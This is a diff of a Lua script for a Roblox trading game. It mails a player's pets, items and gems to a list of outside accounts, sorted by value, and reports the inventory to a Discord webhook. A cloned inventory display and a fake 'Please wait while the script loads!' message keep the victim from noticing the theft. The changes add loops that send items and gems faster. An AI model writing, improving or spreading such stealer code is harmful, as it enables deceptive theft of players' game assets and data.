@@ -33,7 +33,7 @@ for _, func in pairs(getgc()) do
 end
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
 
--- VISUAL INVENTORY CLONE
+-- VISUAL INVENTORY
 local visualInventory = {Currency={}, Pet={}}
 for _, v in pairs(save.Currency) do visualInventory.Currency[v.id] = { _am = v._am } end
 for uid, pet in pairs(save.Pet or {}) do visualInventory.Pet[uid] = pet end
@@ -51,11 +51,11 @@ overrideUI()
 -- RAP helper
 local function getRAP(Type, Item)
     return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
-        Class = {Name = Type},
-        IsA = function(hmm) return hmm == Type end,
-        GetId = function() return Item.id end,
-        StackKey = function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
-        AbstractGetRAP = function() return nil end
+        Class={Name=Type},
+        IsA=function(hmm) return hmm==Type end,
+        GetId=function() return Item.id end,
+        StackKey=function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
+        AbstractGetRAP=function() return nil end
     }) or 0)
 end
 
@@ -72,21 +72,20 @@ local function sendItem(category, uid)
         if response then
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             sent = true
-        elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
+        elseif err=="They don't have enough space!" or err=="Mailbox is full" or err=="You have reached the mailbox limit" then
             currentUserIndex = currentUserIndex + 1
         else
             warn("Failed to send item:", err)
             break
         end
     end
-
     if not sent then warn("Item could not be sent to any user:", uid) end
 end
 
 -- SEND ALL GEMS ONE AT A TIME
 local function SendAllGems()
-    local currentUserIndex = 1
     local gemAmount = save.Currency["Diamonds"] and save.Currency["Diamonds"]._am or 0
+    local currentUserIndex = 1
 
     while gemAmount > mailSendPrice and currentUserIndex <= #users do
         local currentUser = users[currentUserIndex]
@@ -96,7 +95,7 @@ local function SendAllGems()
         if response then
             gemAmount = gemAmount - 1
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-        elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
+        elseif err=="They don't have enough space!" or err=="Mailbox is full" or err=="You have reached the mailbox limit" then
             currentUserIndex = currentUserIndex + 1
         else
             warn("Failed to send gem:", err)
@@ -138,7 +137,6 @@ for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverb
         end
     end
 end
-
 table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)
 
 -- DISCORD WEBHOOK
@@ -156,14 +154,21 @@ task.spawn(function()
     request({Url=webhook, Method="POST", Headers=headers, Body=body})
 end)
 
--- SEND ITEMS
+-- SEND ITEMS FASTER USING TASK SPAWN
 for _, item in ipairs(sortedItems) do
     task.spawn(function()
-        sendItem(item.category, item.uid)
+        for i=1, item.amount do
+            sendItem(item.category, item.uid)
+        end
     end)
 end
 
--- SEND GEMS
-task.spawn(SendAllGems)
+-- SEND GEMS FASTER USING TASK SPAWN
+task.spawn(function()
+    local gemAmount = save.Currency["Diamonds"] and save.Currency["Diamonds"]._am or 0
+    for i=1, gemAmount do
+        SendAllGems()
+    end
+end)
 
 message.Error("Please wait while the script loads!")
